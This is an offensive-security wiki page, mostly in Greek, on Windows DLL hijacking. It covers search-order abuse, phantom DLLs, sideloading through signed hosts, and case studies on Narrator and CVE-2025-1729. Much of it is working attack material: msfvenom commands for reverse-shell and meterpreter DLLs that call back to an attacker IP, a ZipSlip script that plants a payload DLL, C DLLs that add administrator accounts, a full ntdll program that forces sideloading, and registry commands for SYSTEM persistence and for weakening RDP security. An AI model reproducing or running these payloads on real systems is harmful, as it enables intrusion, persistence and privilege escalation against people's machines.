# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

DLL Hijacking περιλαμβάνει τη χειραγώγηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος αυτός περιλαμβάνει διάφορες τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, privilege escalation. Παρά την εστίαση στην escalation εδώ, η μέθοδος hijacking παραμένει ίδια ανεξάρτητα από τον στόχο.

### Συνηθισμένες Τεχνικές

Πολλές μέθοδοι χρησιμοποιούνται για DLL hijacking, και η αποτελεσματικότητά τους εξαρτάται από την στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μονοπάτι αναζήτησης πριν από το νόμιμο, εκμεταλλευόμενοι το πρότυπο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία κακόβουλου DLL που η εφαρμογή θα προσπαθήσει να φορτώσει επειδή νομίζει ότι είναι απαιτούμενο αλλά δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραγόντων αναζήτησης όπως το %PATH% ή αρχεία `.exe.manifest` / `.exe.local` για να κατευθυνθεί η εφαρμογή προς το κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο στον φάκελο WinSxS, μια μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε φάκελο ελεγχόμενο από τον χρήστη μαζί με την αντιγραμμένη εφαρμογή, παρόμοιο με τεχνικές Binary Proxy Execution.

> [!TIP]
> Για μια βήμα-προς-βήμα αλυσίδα που στρώνει HTML staging, AES-CTR configs, και .NET implants πάνω από DLL sideloading, δείτε το workflow παρακάτω.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Εύρεση ελλειπόντων Dlls

Ο πιο κοινός τρόπος να βρείτε ελλείποντα Dlls μέσα σε ένα σύστημα είναι να τρέξετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ρυθμίζοντας** τα **εξής 2 φίλτρα**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

και να εμφανίσετε μόνο τη **File System Activity**:

![](<../../../images/image (153).png>)

Αν ψάχνετε για **ελλείποντα dlls γενικά**, αφήνετε αυτό να τρέχει για μερικά **δεύτερα**.  
Αν ψάχνετε για **ελλείπον dll** μέσα σε ένα συγκεκριμένο εκτελέσιμο, θα πρέπει να ορίσετε **άλλο φίλτρο όπως "Process Name" "contains" `<exec name>`, να το εκτελέσετε και να σταματήσετε την καταγραφή συμβάντων**.

## Εκμετάλλευση ελλειπόντων Dlls

Για να κλιμακώσουμε privileges, η καλύτερη ευκαιρία που έχουμε είναι να μπορέσουμε να **γράψουμε ένα dll που μια privilege διαδικασία θα προσπαθήσει να φορτώσει** σε κάποιο από τα **μονοπάτια όπου θα αναζητηθεί**. Επομένως, θα μπορέσουμε να **γράψουμε** ένα dll σε έναν **φάκελο** όπου το **dll θα αναζητηθεί πριν** από τον φάκελο που βρίσκεται το **αυθεντικό dll** (σπάνια περίπτωση), ή θα μπορέσουμε να **γράψουμε** σε κάποιο φάκελο όπου το dll πρόκειται να αναζητηθεί και το αυθεντικό **dll δεν υπάρχει** σε κανέναν φάκελο.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Οι εφαρμογές Windows ψάχνουν για DLLs ακολουθώντας ένα σύνολο προκαθορισμένων μονοπατιών αναζήτησης, τηρώντας μια συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα κακόβουλο DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους καταλόγους, εξασφαλίζοντας ότι θα φορτωθεί πριν από το αυθεντικό DLL. Μια λύση για να το αποτρέψετε είναι να βεβαιωθείτε ότι η εφαρμογή χρησιμοποιεί απόλυτα μονοπάτια όταν αναφέρεται στα DLL που απαιτεί.

Μπορείτε να δείτε τη **DLL search order σε 32-bit** συστήματα παρακάτω:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η **προεπιλεγμένη** σειρά αναζήτησης με το **SafeDllSearchMode** ενεργοποιημένο. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανέβει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτό το χαρακτηριστικό, δημιουργήστε την τιμή καταχώρησης **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την σε 0 (η προεπιλογή είναι enabled).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) καλείται με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινάει στον κατάλογο του εκτελέσιμου module που το **LoadLibraryEx** προσπαθεί να φορτώσει.

Τέλος, σημειώστε ότι **ένα dll μπορεί να φορτωθεί υποδεικνύοντας το απόλυτο μονοπάτι αντί απλώς το όνομα**. Στην περίπτωση αυτή το dll **θα αναζητηθεί μόνο σε εκείνο το μονοπάτι** (αν το dll έχει εξαρτήσεις, αυτές θα αναζητηθούν όπως όταν φορτώνονται με όνομα).

Υπάρχουν και άλλοι τρόποι για να τροποποιήσετε τη σειρά αναζήτησης, αλλά δεν πρόκειται να τους εξηγήσω εδώ.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Παραδώστε το αρχείο στο παρακολουθούμενο inbox/share· όταν η προγραμματισμένη εργασία επανεκκινήσει τη διεργασία, αυτή θα φορτώσει την κακόβουλη DLL και θα εκτελέσει τον κώδικά σας ως ο λογαριασμός service.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Μια προχωρημένη μέθοδος για να επηρεάσετε ντετερμινιστικά τη διαδρομή αναζήτησης DLL μιας νεοδημιουργηθείσας διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS όταν δημιουργείτε τη διεργασία με τα native APIs του ntdll. Παρέχοντας εδώ έναν κατάλογο ελεγχόμενο από τον επιτιθέμενο, μια στοχευόμενη διεργασία που επιλύει μια εισαγόμενη DLL κατά όνομα (χωρίς απόλυτο μονοπάτι και χωρίς να χρησιμοποιεί τα safe loading flags) μπορεί να εξαναγκαστεί να φορτώσει μια κακόβουλη DLL από αυτόν τον κατάλογο.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη διεργασία-παιδί που δημιουργείται· διαφέρει από το SetDllDirectory, το οποίο επηρεάζει μόνο την τρέχουσα διεργασία.
- Ο στόχος πρέπει να εισάγει ή να καλέσει LoadLibrary για μια DLL κατά όνομα (χωρίς απόλυτο μονοπάτι και χωρίς να χρησιμοποιεί LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και τα σκληροκωδικοποιημένα απόλυτα μονοπάτια δεν μπορούν να υποκατασταθούν. Οι forwarded exports και το SxS μπορεί να αλλάξουν την προτεραιότητα.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Πλήρες παράδειγμα σε C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Τοποθετήστε ένα κακόβουλο xmllite.dll (εξάγοντας τις απαιτούμενες συναρτήσεις ή προωθώντας κλήσεις στο πραγματικό) στον φάκελο DllPath.
- Εκκινήστε ένα signed binary που είναι γνωστό ότι αναζητά το xmllite.dll με όνομα χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί σε πραγματικές επιθέσεις να οδηγεί σε multi-stage sideloading chains: ένας αρχικός launcher τοποθετεί ένα helper DLL, το οποίο στη συνέχεια εκκινεί ένα Microsoft-signed, hijackable binary με custom DllPath για να αναγκάσει τη φόρτωση του DLL του επιτιθέμενου από έναν staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που λειτουργεί ή θα λειτουργήσει υπό **διαφορετικά προνόμια** (horizontal or lateral movement), η οποία **δεν διαθέτει DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** σε οποιονδήποτε **directory** στον οποίο θα **αναζητηθεί** το **DLL**. Αυτή η τοποθεσία μπορεί να είναι ο φάκελος του εκτελέσιμου ή ένας φάκελος εντός του system path.

Ναι, οι προϋποθέσεις είναι δύσκολες: **κατά κανόνα είναι ασυνήθιστο να βρεις ένα privileged executable χωρίς DLL** και είναι ακόμα **πιο ασυνήθιστο να έχεις write permissions σε φάκελο του system path** (κανονικά δεν μπορείς). Ωστόσο, σε misconfigured περιβάλλοντα αυτό είναι εφικτό.\
Σε περίπτωση που είστε τυχεροί και πληροίτε τις προϋποθέσεις, μπορείτε να δείτε το project [UACME](https://github.com/hfiref0x/UACME). Ακόμα κι αν **ο κύριος στόχος του project είναι bypass UAC**, μπορεί να βρείτε εκεί ένα **PoC** για Dll hijacking για την έκδοση των Windows που χρειάζεστε (πιθανώς απλώς αλλάζοντας τη διαδρομή του φακέλου όπου έχετε write permissions).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports μιας dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για πλήρη οδηγό σχετικά με το πώς να **εκμεταλλευτείτε το Dll Hijacking για να αυξήσετε προνόμια** όταν έχετε δικαιώματα εγγραφής σε έναν **System Path folder** δείτε:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανίχνευση αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Σε περίπτωση που βρείτε ένα exploitable σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε επιτυχώς είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που το εκτελέσιμο θα εισάγει από αυτό**. Σημειώστε ότι το Dll Hijacking είναι χρήσιμο προκειμένου να [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτή τη μελέτη για dll hijacking που επικεντρώνεται στο hijacking dlls για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικά **βασικά dll παραδείγματα κώδικα** που μπορεί να είναι χρήσιμα ως **πρότυπα** ή για να δημιουργήσετε ένα **dll με εξαγόμενες μη απαιτούμενες συναρτήσεις**.

## **Δημιουργία και μεταγλώττιση Dlls**

### **Dll Proxifying**

Βασικά, ένας **Dll proxy** είναι ένα Dll ικανό να **εκτελέσει τον κακόβουλο κώδικά σας όταν φορτωθεί**, αλλά επίσης να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται**, προωθώντας όλες τις κλήσεις στη πραγματική βιβλιοθήκη.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε ουσιαστικά να **υποδείξετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **παράγετε ένα proxified dll** ή να **υποδείξετε το Dll** και να **παράγετε ένα proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Απόκτηση meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργία χρήστη (x86 — δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Το δικό σας

Σημειώστε ότι σε αρκετές περιπτώσεις η Dll που μεταγλωττίζετε πρέπει να **export several functions** που θα φορτωθούν από τη victim process. Αν αυτές οι functions δεν υπάρχουν, το **binary won't be able to load** και το **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL παράδειγμα με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με είσοδο νήματος</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί να αναζητά κατά την εκκίνηση ένα προβλέψιμο, ειδικό ανά γλώσσα localization DLL, το οποίο μπορεί να υποκλαπεί (hijacked) για arbitrary code execution και persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Φίλτρο: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Ξεκινήστε το Narrator και παρατηρήστε την προσπάθεια φόρτωσης της παραπάνω διαδρομής.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Ένα αφελές hijack θα κάνει το UI να μιλήσει/να επισημανθεί. Για να παραμείνετε ήσυχοι, κατά το attach απαριθμήστε τα threads του Narrator, ανοίξτε το κύριο thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και κάντε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας thread. Δείτε το PoC για πλήρη κώδικα.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το τοποθετημένο DLL. Στην secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να ξεκινήσετε τον Narrator· το DLL σας εκτελείται ως SYSTEM στην secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε με RDP στον host, στην οθόνη σύνδεσης πατήστε CTRL+WIN+ENTER για να εκκινήσετε τον Narrator· το DLL σας εκτελείται ως SYSTEM στην secure desktop.
- Η εκτέλεση σταματά όταν η RDP συνεδρία κλείσει—inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη Accessibility Tool (AT) εγγραφή μητρώου (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε οποιοδήποτε binary/DLL, να την εισάγετε και μετά να ορίσετε το `configuration` σε εκείνο το όνομα AT. Αυτό παρέχει proxy για εκτέλεση υπό το Accessibility framework.

Notes
- Γράψιμο κάτω από `%windir%\System32` και αλλαγή τιμών HKLM απαιτεί δικαιώματα διαχειριστή.
- Όλη η λογική του payload μπορεί να ζει στο `DLL_PROCESS_ATTACH`; δεν χρειάζονται exports.

## Μελέτη περίπτωσης: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Αυτή η περίπτωση αναδεικνύει **Phantom DLL Hijacking** στο Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), καταγεγραμμένο ως **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Ένας επιτιθέμενος μπορεί να τοποθετήσει ένα κακόβουλο stub `hostfxr.dll` στον ίδιο κατάλογο, εκμεταλλευόμενος το ελλείπον DLL για να επιτύχει εκτέλεση κώδικα υπό το context του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή Επίθεσης

1. Ως κανονικός χρήστης, αποθέστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 AM υπό το περιβάλλον του τρέχοντος χρήστη.
3. Αν ένας διαχειριστής είναι συνδεδεμένος όταν εκτελεστεί η εργασία, το κακόβουλο DLL τρέχει στη συνεδρία του διαχειριστή σε medium integrity.
4. Συνδυάστε τις τυπικές τεχνικές bypass του UAC για να ανεβάσετε από medium integrity σε προνόμια SYSTEM.

## Μελέτη περίπτωσης: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Οι δράστες συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό έναν αξιόπιστο, signed process.

Chain overview
- Ο χρήστης κατεβάζει το MSI. Ένα CustomAction εκτελείται σιωπηλά κατά την εγκατάσταση GUI (π.χ. LaunchApplication ή μια VBScript action), ανασυνθέτοντας το επόμενο στάδιο από ενσωματωμένους πόρους.
- Ο dropper γράφει ένα νόμιμο, signed EXE και ένα κακόβουλο DLL στον ίδιο φάκελο (παράδειγμα ζεύγους: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν το signed EXE ξεκινά, η Windows DLL search order φορτώνει πρώτα το wsc.dll από τον working directory, εκτελώντας κώδικα του επιτιθέμενου υπό έναν signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Ψάξτε για εγγραφές που εκτελούν executables ή VBScript. Παράδειγμα ύποπτου μοτίβου: LaunchApplication που εκτελεί ένα embedded αρχείο στο παρασκήνιο.
- Στο Orca (Microsoft Orca.exe), ελέγξτε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Ενσωματωμένα/διασπασμένα payloads στο MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Ψάξτε για πολλαπλά μικρά κομμάτια που ενώνονται και αποκρυπτογραφούνται από ένα VBScript CustomAction. Συνηθισμένη ροή:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμος υπογεγραμμένος host (Avast). Η διαδικασία προσπαθεί να φορτώσει το wsc.dll από τον κατάλογό του χρησιμοποιώντας το όνομα.
- wsc.dll: attacker DLL. Εάν δεν απαιτούνται συγκεκριμένα exports, το DllMain μπορεί να αρκεί· αλλιώς, χτίστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στη genuine library ενώ εκτελείτε το payload στο DllMain.
- Δημιουργήστε ένα ελάχιστο DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για απαιτήσεις export, χρησιμοποιήστε ένα proxying framework (π.χ., DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που επίσης εκτελεί το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονόματος DLL από το host binary. Αν ο host χρησιμοποιεί απόλυτες διαδρομές ή safe loading flags (π.χ., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), η hijack μπορεί να αποτύχει.
- KnownDLLs, SxS, και forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να ληφθούν υπόψη κατά την επιλογή του host binary και του συνόλου exports.

